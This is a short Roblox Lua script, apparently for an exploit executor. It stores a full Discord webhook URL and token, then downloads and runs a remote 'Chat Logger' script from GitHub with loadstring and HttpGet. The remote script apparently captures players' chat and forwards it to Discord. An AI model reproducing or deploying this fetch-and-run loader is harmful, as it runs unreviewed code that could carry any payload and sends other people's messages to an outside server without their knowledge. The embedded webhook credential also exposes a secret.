if not game:IsLoaded() then game.Loaded:Wait() end

local _genv = getgenv() or _G

_genv.CH = {
    Enable = true, -- on/off
	url = 'https://discord.com/api/webhooks/884248737612959814/KR4r6Xnh4mxjohOocJCZY_11ie2wX5MX_7fpWodjMPJjXJyj-5l6LWBcdTZ0SxuCSsAk'
}

if CH.Enable then
	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Input50/Something/master/Misc/Chat%20Logger.lua"), true))()
end